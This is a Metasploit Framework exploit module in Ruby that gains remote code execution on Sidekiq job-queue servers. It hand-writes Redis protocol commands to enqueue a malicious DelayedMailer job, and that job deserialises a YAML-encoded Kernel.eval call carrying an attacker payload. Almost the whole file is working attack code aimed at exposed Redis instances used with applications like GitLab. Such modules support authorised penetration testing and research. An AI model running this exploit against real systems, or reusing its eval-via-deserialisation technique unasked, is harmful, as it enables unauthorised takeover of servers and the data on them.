##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'json'
require 'yaml'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sidekiq DelayedMailer Code Execution',
      'Description'    => %q{
        This module exploits the Sidekiq job queue in its default configuration.
       Sidekiq, commonly used with Gitlab, is a Ruby job queing and processing
       framework. The default intallation comes with a DelayedMailer utility which
       allows for applications to easily post-pone sending email after a user's action.
       The DelayedMailer class deserializes a YAML string, and calls a specified

       function, with user specified arguments. This can be used to execute arbitrary
       code.
      },
      'Author'         => [ 'jwpari <jwpari[at]beersec.org>' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'ruby',
      'Arch'           => ARCH_RUBY,
      'Privileged'     => false,
      'Targets'        => [ ['Automatic', {} ] ],
      'DisclosureDate' => 'Sep 27 2013',
      'DefaultTarget' => 0
    ))

    register_options(
      [
        Opt::RPORT(6379),
        OptString.new('QUEUE', [true, 'Redis list to add the Sidekiq job to', 'resque:gitlab:schedule'])
      ], self.class)
  end

  def exploit
    connect
    print_status("Sending payload")
    sock.puts(make_payload)

    disconnect

    print_status("Waiting for a worker to pick up the job")

    1.upto(120) do
      break if session_created?
      select(nil, nil, nil, 0.25)
      handler()
    end

  end

  def make_payload

    queue = datastore['QUEUE']
    # See sidekiq-2.14.0/lib/sidekiq/extensions/action_mailer.rb
    # The Sidekiq::Extensions::DelayedMailer worker takes "args" from the job,

    # and runs:

    # (target, method_name, args) = YAML.load(yml)
    #    msg = target.send(method_name, *args)

    invocation = [
      Kernel,
      :eval,
      payload.encoded
    ]

    # Essentially, with the above as arguments we run:
    # Kernel.send(:eval,"payload")

    job = {
      'class'=> "Sidekiq::Extensions::DelayedMailer",
      'args' => [YAML.dump(invocation)],
      'enqueued_at'=> 0,
      'jid'=> "0",
      'queue'=> "default",
      'retry'=> true
    }

    json_job = JSON.generate(job)

    run_at = "0" # time to run job, 0 puts it at the front of the queue

    # redis-cli eqivalent:
    # zadd #{queue} 0 #{json_job}
    # redis wire protocol http://redis.io/topics/protocol

    payload =

      "*4\r\n$4\r\nzadd\r\n"+
      "$#{queue.length}\r\n"+
      "#{queue}\r\n"+
      "$#{run_at.length}\r\n"+
      "#{run_at}\r\n"+
      "$#{json_job.length}\r\n"+
      "#{json_job}\r\n"

    return payload

  end

end
